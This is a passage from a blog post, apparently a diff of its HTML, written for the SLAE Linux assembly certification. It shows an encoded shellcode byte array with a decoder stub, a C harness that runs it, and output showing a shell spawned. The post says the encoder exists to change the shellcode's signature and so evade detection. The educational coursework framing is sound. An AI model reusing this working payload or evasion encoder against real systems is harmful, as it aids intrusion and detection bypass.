+<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa</span><span class=s>&#34;</span><span class=p>;</span> 
+
+<span class=n>main</span><span class=p>()</span>
+<span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>shellcode</span><span class=p>));</span>
+        <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>shellcode</span><span class=p>;</span>
+        <span class=n>ret</span><span class=p>();</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The program can be compiled like this:</p>
+<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ gcc -fno-stack-protector -z execstack shellcode.c -o build/shellcode
+dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ ./build/shellcode
+Shellcode length:  152
+$ whoami
+dubs3c
+$
+</code></pre><p>That&rsquo;s it, we have created a simple encoder for automatically changing the signature of our shellcode.</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: SLAE-1490</p>
+</article>
+</div><footer>
+</footer></main>
+<script src=/js/particles.min.js defer></script>
+<script src=/js/particles.conf.js defer></script>
+<script src=/js/baffle.min.js async></script>
+<script src=/js/main.js defer async></script>
+</body>
+</html>
